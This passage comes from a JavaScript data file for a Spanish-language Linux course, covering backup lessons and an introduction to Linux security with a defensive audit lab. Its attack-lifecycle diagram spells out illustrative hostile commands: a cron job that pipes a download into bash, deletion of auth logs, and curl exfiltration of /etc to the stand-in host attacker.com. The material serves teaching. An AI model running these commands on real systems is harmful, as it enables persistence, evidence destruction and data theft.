          { cmd: "cat > ~/scripts/backup_completo.sh << 'EOF'\n#!/bin/bash\nFECHA=$(date +%Y%m%d_%H%M%S)\nBACKUP_DIR=\"/tmp/backups\"\nmkdir -p $BACKUP_DIR\necho \"[$(date)] Iniciando backup...\"\ntar -czf $BACKUP_DIR/backup_$FECHA.tar.gz ~/documentos/\nsha256sum $BACKUP_DIR/backup_$FECHA.tar.gz >> $BACKUP_DIR/checksums.txt\necho \"[$(date)] Backup completado: backup_$FECHA.tar.gz\"\nEOF", explanation: 'Script completo de backup con checksum.' },
          { cmd: 'chmod +x ~/scripts/backup_completo.sh', explanation: 'Permisos de ejecución.' },
        ],
        expected: 'Script backup_completo.sh creado',
        technical: 'Este script puede programarse con cron para ejecutarse automáticamente cada noche.',
        hints: ['Crea el script con cat heredoc y dale chmod +x'],
      },
    ],
    commonErrors: [
      { error: 'tar: Removing leading / from member names', solution: 'Es una advertencia normal al comprimir rutas absolutas. tar elimina el / inicial para evitar sobreescribir archivos del sistema al extraer.' },
    ],
  },
  quiz: [
    { type: 'fill', question: "Para extraer un archivo tar.gz: `tar ___f backup.tar.gz`", correct: ['-xzf', '-xz', 'xzf'], explanation: '-x=extract, -z=gzip, -f=archivo. También funciona -xvzf para modo verbose.' },
    { type: 'multiple', question: '¿Qué hace sha256sum -c checksums.txt?', options: ['Calcula nuevos checksums', 'Verifica que los archivos coinciden con los hashes guardados', 'Crea el archivo checksums.txt', 'Comprime los archivos'], correct: 1, explanation: '-c (check) lee el archivo de checksums y verifica que los archivos referenciados tienen los hashes correctos.' },
    { type: 'true_false', question: 'rsync transfiere el archivo completo cada vez que hay algún cambio.', correct: false, explanation: 'rsync usa su algoritmo delta: solo transfiere los bloques del archivo que cambiaron. Esto lo hace muy eficiente para backups incrementales.' },
    { type: 'multiple', question: '¿Cuál es la regla de backup 3-2-1?', options: ['3 discos, 2 tipos, 1 backup', '3 copias, 2 medios diferentes, 1 copia offsite', '3 backups diarios, 2 semanales, 1 mensual', '3 servidores, 2 centros de datos, 1 nube'], correct: 1, explanation: '3 copias totales (original + 2 backups), en 2 medios de almacenamiento diferentes, con 1 copia fuera de las instalaciones.' },
    { type: 'multiple', question: '¿Por qué los backups offline son resistentes al ransomware?', options: ['Están cifrados', 'No están conectados a la red y no pueden ser accedidos por el malware', 'Están en la nube', 'Tienen antivirus'], correct: 1, explanation: 'El ransomware cifra archivos accesibles a través de la red. Los backups offline (cintas, discos desconectados) no son accesibles para el malware.' },
  ],
  missions: [
    { id: 'm1d19', title: 'Crea un backup con tar', description: 'tar -czf backup.tar.gz ~/documentos/', hint: '$ tar -czf /tmp/backup.tar.gz ~/documentos/', xp: 35, condition: condCmd('tar') },
    { id: 'm2d19', title: 'Lista contenido del backup', description: 'tar -tzf backup.tar.gz', hint: '$ tar -tzf /tmp/backup.tar.gz', xp: 25, condition: { type: 'command_with_flag', command: 'tar', flag: '-tzf' } },
    { id: 'm3d19', title: 'Calcula checksum SHA-256', description: 'sha256sum del backup', hint: '$ sha256sum /tmp/backup.tar.gz', xp: 35, condition: condCmd('sha256sum') },
    { id: 'm4d19', title: 'Crea el script de backup', description: 'Script backup_completo.sh', hint: '$ touch ~/scripts/backup_completo.sh', xp: 40, condition: condFile('~/scripts/backup_completo.sh') },
  ],
  resources: [
    { name: 'Backup Strategies', url: 'https://www.digitalocean.com/community/tutorials/how-to-choose-an-effective-backup-strategy-for-your-vps', icon: '💾' },
    { name: 'rsync Guide', url: 'https://rsync.samba.org/documentation.html', icon: '📖' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 20 — Introducción a la Ciberseguridad Linux
// ─────────────────────────────────────────────────────────────
{
  day: 20, title: 'Introducción a la Ciberseguridad Linux',
  category: 'cyber', xp: 600,
  tags: ['ciberseguridad', 'CIA', 'amenazas', 'hardening', 'CVE'],
  objectives: [
    'Entender los principios CIA (Confidencialidad, Integridad, Disponibilidad)',
    'Conocer las principales amenazas para servidores Linux',
    'Aprender el concepto de superficie de ataque',
    'Aplicar principios básicos de hardening',
    'Entender el ciclo de vida de un ataque',
  ],
  theory: {
    intro: 'A partir de hoy, todos los conceptos que aprendiste de Linux y Bash se convierten en herramientas de defensa. La ciberseguridad en Linux no es un tema separado: es la aplicación correcta de todo lo que ya sabes.',
    sections: [
      {
        type: 'dual',
        technical: 'La tríada CIA es el marco conceptual de la seguridad de la información. Confidencialidad: acceso solo a usuarios autorizados (criptografía, ACLs). Integridad: datos no alterados sin autorización (hashes, firmas digitales). Disponibilidad: sistemas accesibles cuando se necesitan (redundancia, backups).',
        simple: 'CIA son tres pilares: que tus datos sean PRIVADOS (solo tú los ves), que sean CORRECTOS (nadie los alteró), y que estén DISPONIBLES (puedes acceder cuando los necesitas). Un ataque viola uno o más de estos principios.',
      },
      {
        type: 'text',
        title: 'Ciclo de vida de un ataque (MITRE ATT&CK)',
        body: '1. Reconocimiento: el atacante recopila información (IPs, puertos, versiones). 2. Acceso inicial: explota una vulnerabilidad (SSH débil, web app, phishing). 3. Escalada de privilegios: intenta obtener root. 4. Persistencia: instala backdoor o cron job. 5. Movimiento lateral: se expande a otros sistemas. 6. Exfiltración: roba datos.',
      },
      {
        type: 'text',
        title: 'Superficie de ataque en Linux',
        body: 'Cada servicio expuesto, cada usuario con acceso, cada paquete instalado, cada permiso mal configurado es parte de la superficie de ataque. Hardening es el proceso de reducirla: cerrar puertos innecesarios, deshabilitar servicios no usados, aplicar principio de mínimo privilegio, mantener el sistema actualizado.',
      },
      {
        type: 'note',
        label: 'El 80% de los ataques explotan vulnerabilidades conocidas',
        body: 'La mayoría de los compromisos no usan exploits de día cero. Explotan configuraciones incorrectas (SSH con contraseña débil), software sin actualizar (CVEs públicos) y errores de permisos. El hardening básico previene el 80% de los ataques reales.',
      },
    ],
    diagram: {
      title: 'Ciclo de vida de un ataque a servidor Linux',
      content: `[Internet]
    │
    ▼ Reconocimiento
nmap -sV servidor.com
    │
    ▼ Acceso inicial
ssh root@servidor (contraseña débil)
    │
    ▼ Escalada de privilegios
sudo -l / find / -perm -4000
    │
    ▼ Persistencia
echo "*/5 * * * * curl malware|bash" | crontab -
    │
    ▼ Limpieza de rastros
rm /var/log/auth.log
    │
    ▼ Exfiltración
tar -czf datos.tar.gz /etc/ && curl -F file=@datos.tar.gz attacker.com`,
    },
    realCase: {
      title: 'SolarWinds: el ataque más sofisticado de la última década',
      body: 'En 2020, atacantes comprometieron el proceso de build de SolarWinds, insertando backdoors en actualizaciones legítimas del software Orion. 18,000 organizaciones instalaron el software malicioso, incluyendo agencias del gobierno de EE.UU. La CIA fue violada: confidencialidad (datos robados), integridad (software alterado). El ataque fue indetectable por meses.',
    },
  },
  commands: [
    {
      name: 'uname -a && cat /etc/os-release',
      brief: 'Identificar el sistema para evaluar vulnerabilidades',
      technical: 'Los CVEs (Common Vulnerabilities and Exposures) se asocian a versiones específicas de software. Identificar la versión exacta es el primer paso para evaluar la exposición.',
      simple: 'Saber exactamente qué versión del sistema y kernel tienes permite buscar si hay vulnerabilidades conocidas que afectan tu sistema.',
      syntax: [
        { cmd: 'uname -r',                          desc: 'Versión del kernel (para buscar CVEs del kernel)' },
        { cmd: 'cat /etc/os-release',               desc: 'Versión exacta de la distribución' },
        { cmd: 'dpkg -l | grep "nombre_paquete"',   desc: 'Versión de un paquete instalado' },
      ],
      errors: [],
      security: 'Busca la versión de tu kernel en https://cve.mitre.org para ver si hay vulnerabilidades conocidas sin parchear.',
    },
    {
      name: 'last && lastb',
      brief: 'Ver historial de logins y fallos de autenticación',
      technical: 'last lee /var/log/wtmp (logins exitosos). lastb lee /var/log/btmp (intentos fallidos). Ambos usan el formato utmp.',
      simple: 'last muestra quién se conectó y cuándo. lastb muestra intentos fallidos de login.',
      syntax: [
        { cmd: 'last',          desc: 'Historial de logins exitosos' },
        { cmd: 'last', flag: '-10', desc: 'Últimos 10 logins' },
        { cmd: 'who',           desc: 'Usuarios conectados ahora mismo' },
        { cmd: 'w',             desc: 'Usuarios conectados con actividad' },
      ],
      errors: [],
      security: 'last y who son los primeros comandos en un análisis de incidentes: ¿quién estaba conectado cuando ocurrió el incidente?',
    },
    {
      name: 'find / -perm -4000',
      brief: 'Encontrar archivos con bit SUID (vectores de escalada)',
      technical: 'El bit SUID (4000) hace que el ejecutable corra con los permisos del propietario (frecuentemente root). Si el ejecutable tiene vulnerabilidades, puede ser explotado para escalar privilegios.',
      simple: 'Encuentra programas que corren como root aunque los ejecute un usuario normal. Algunos de estos pueden ser explotados para obtener acceso root.',
      syntax: [
        { cmd: 'find / -perm -4000 2>/dev/null',              desc: 'Archivos con SUID (potencialmente explotables)' },
        { cmd: 'find / -perm -2000 2>/dev/null',              desc: 'Archivos con SGID' },
        { cmd: 'find / -perm -4000 -type f 2>/dev/null',     desc: 'Solo archivos ejecutables con SUID' },
      ],
      errors: [],
      security: 'Compara la salida con el baseline de tu sistema. Nuevos binarios SUID no autorizados son señal de compromiso o backdoor.',
    },
  ],
  lab: {
    title: 'Evaluación básica de seguridad de un servidor Linux',
    context: 'Realizarás una evaluación básica de seguridad (security assessment) del servidor, documentando la superficie de ataque y posibles puntos débiles.',
    duration: '35 min', xp: 200,
    steps: [
      {
        title: 'Documenta el sistema',
        body: 'Identifica la versión del sistema operativo y kernel para buscar CVEs.',
        commands: [
          { cmd: 'uname -a', explanation: 'Versión completa del kernel.' },
          { cmd: 'cat /etc/os-release | grep -E "NAME|VERSION"', explanation: 'Distribución y versión.' },
        ],
        expected: 'Linux linux-academy 5.15.0-91-generic\nNAME="Ubuntu"\nVERSION="22.04.3 LTS"',
        technical: 'Con la versión exacta del kernel, puedes buscar en CVE Mitre si hay vulnerabilidades conocidas sin parchear.',
        hints: ['$ uname -a', '$ cat /etc/os-release | grep -E "NAME|VERSION"'],
      },
      {
        title: 'Audita los usuarios con acceso',
        body: 'Identifica qué usuarios pueden hacer login interactivo.',
        commands: [
          { cmd: "grep '/bin/bash\\|/bin/sh' /etc/passwd", explanation: 'Usuarios con shells de login.' },
          { cmd: 'who', explanation: 'Usuarios conectados ahora.' },
        ],
        expected: 'root y estudiante tienen shell de login',
        technical: 'Principio de mínimo acceso: solo los usuarios que necesitan login interactivo deben tenerlo.',
        hints: ["$ grep '/bin/bash' /etc/passwd"],
      },
      {
        title: 'Analiza puertos expuestos',
        body: 'Identifica la superficie de ataque de red.',
        commands: [{ cmd: 'ss -tlnp', explanation: 'Puertos TCP en escucha con proceso.' }],
        expected: 'LISTEN :22 sshd\nLISTEN :631 cupsd',
        technical: 'Cada puerto abierto es una puerta potencial. Solo deben estar abiertos los servicios necesarios.',
        hints: ['$ ss -tlnp'],
      },
      {
        title: 'Busca archivos SUID sospechosos',
        body: 'Identifica archivos con bit SUID que podrían ser vectores de escalada.',
        commands: [{ cmd: 'find / -perm -4000 -type f 2>/dev/null', explanation: 'Archivos ejecutables con SUID.' }],
        expected: '/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/su',
        technical: 'sudo, passwd y su son SUID legítimos. Cualquier otro binario SUID no estándar debe investigarse.',
        hints: ['$ find / -perm -4000 -type f 2>/dev/null'],
      },
      {
        title: 'Revisa el historial de logins',
        body: 'Analiza quién se ha conectado al servidor.',
        commands: [{ cmd: 'last -10', explanation: 'Últimos 10 logins al sistema.' }],
        expected: 'estudiante pts/0 192.168.1.100 Mon Jan 15 10:00',
        technical: 'IPs desconocidas en el historial de last son señal de acceso no autorizado.',
        hints: ['$ last -10'],
      },
    ],
    commonErrors: [
      { error: 'last: cannot open /var/log/wtmp', solution: 'El archivo de log no existe o fue borrado. La ausencia de wtmp puede indicar que un atacante limpió los rastros.' },
    ],
  },
  quiz: [
    { type: 'multiple', question: '¿Qué representa la "I" en la tríada CIA de ciberseguridad?', options: ['Identificación', 'Inteligencia', 'Integridad', 'Incidentes'], correct: 2, explanation: 'Integridad: los datos no han sido alterados de forma no autorizada. Garantizada con hashes, firmas digitales y control de versiones.' },
    { type: 'fill', question: 'Para buscar archivos con el bit SUID (potencialmente explotables): `find / -perm ___ 2>/dev/null`', correct: ['-4000', '-u+s'], explanation: '-perm -4000 encuentra archivos con el bit SUID activado. Estos ejecutan con permisos del propietario (a menudo root).' },
    { type: 'true_false', question: 'La mayoría de los ataques exitosos explotan vulnerabilidades de día cero (zero-days) desconocidas.', correct: false, explanation: 'El 80% de los ataques exitosos explotan vulnerabilidades conocidas (CVEs publicados) o configuraciones incorrectas. El hardening básico previene la mayoría.' },
    { type: 'multiple', question: '¿Qué fase del ataque viene después de obtener acceso inicial?', options: ['Reconocimiento', 'Exfiltración', 'Escalada de privilegios', 'Movimiento lateral'], correct: 2, explanation: 'Según MITRE ATT&CK: Reconocimiento → Acceso inicial → Escalada de privilegios → Persistencia → Movimiento lateral → Exfiltración.' },
    { type: 'multiple', question: '¿Cuál de estas acciones reduce más la superficie de ataque de un servidor?', options: ['Instalar antivirus', 'Deshabilitar servicios no necesarios y cerrar puertos innecesarios', 'Cambiar el fondo de pantalla', 'Renombrar la cuenta de administrador'], correct: 1, explanation: 'Cada servicio/puerto abierto es una superficie de ataque. Deshabilitar lo innecesario (principio de mínimo servicio) es el hardening más efectivo.' },
  ],
  missions: [
    { id: 'm1d20', title: 'Documenta el kernel', description: 'uname -a para identificar CVEs potenciales', hint: '$ uname -a', xp: 30, condition: { type: 'command_with_flag', command: 'uname', flag: '-a' } },
    { id: 'm2d20', title: 'Audita usuarios con shell', description: "grep '/bin/bash' /etc/passwd", hint: "$ grep '/bin/bash' /etc/passwd", xp: 35, condition: { type: 'command_executed', command: "grep '/bin/bash' /etc/passwd" } },
    { id: 'm3d20', title: 'Analiza puertos expuestos', description: 'ss -tlnp para ver superficie de red', hint: '$ ss -tlnp', xp: 35, condition: { type: 'command_with_flag', command: 'ss', flag: '-tlnp' } },
    { id: 'm4d20', title: 'Busca archivos SUID', description: 'find / -perm -4000', hint: '$ find / -perm -4000 -type f 2>/dev/null', xp: 50, condition: { type: 'command_matches', pattern: 'find.*-perm.*4000' } },
  ],
  resources: [
    { name: 'MITRE ATT&CK Framework', url: 'https://attack.mitre.org', icon: '🎯' },
    { name: 'CIS Linux Benchmarks', url: 'https://www.cisecurity.org/cis-benchmarks', icon: '🛡️' },
    { name: 'CVE Mitre', url: 'https://cve.mitre.org', icon: '🔍' },
  ],
},

]
